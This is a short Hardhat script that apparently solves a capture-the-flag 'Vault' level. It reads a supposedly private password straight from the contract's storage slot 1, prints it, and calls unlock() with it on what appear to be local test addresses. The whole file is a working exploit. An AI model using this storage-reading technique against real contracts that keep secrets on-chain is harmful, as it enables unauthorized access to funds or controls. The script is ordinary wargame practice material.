import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf6cB1Bc71F7ed659E64C8a56dA5759494480e333"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Vault", CONTRACT_ADDRESS, signer)


    // password is at storage slot 1

    const password = await contract.provider.getStorageAt(contract.address, 1)

    console.log(`password = ${password} "${Buffer.from(password.slice(2), `hex`)}"`)

    await contract.unlock(password)
    const locked = await contract.locked();
    console.log("is locked: ", locked);
    
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});